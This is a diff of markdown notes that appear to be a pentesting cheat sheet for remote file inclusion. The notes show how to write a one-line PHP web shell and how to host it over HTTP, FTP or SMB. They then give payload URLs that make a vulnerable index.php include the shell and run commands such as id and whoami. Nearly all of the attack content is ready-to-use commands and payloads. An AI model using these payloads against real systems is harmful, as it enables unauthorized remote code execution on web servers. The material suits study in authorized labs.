@@ -1,10 +1,7 @@
-
-
 Create php page
 ```shell-session
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
-
 
 ### HTTP method
 Start call back server
@@ -17,7 +14,6 @@ Execution payload
 http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
 ```
 
-
 ### FTP method
 Start ftp server
 ```shell-session
@@ -28,8 +24,6 @@ Execution payload
 ```http
 http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
 ```
-
-
 
 ### SMB Method
 
@@ -42,3 +36,4 @@ Execution payload
 ```http
 http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 ```
+
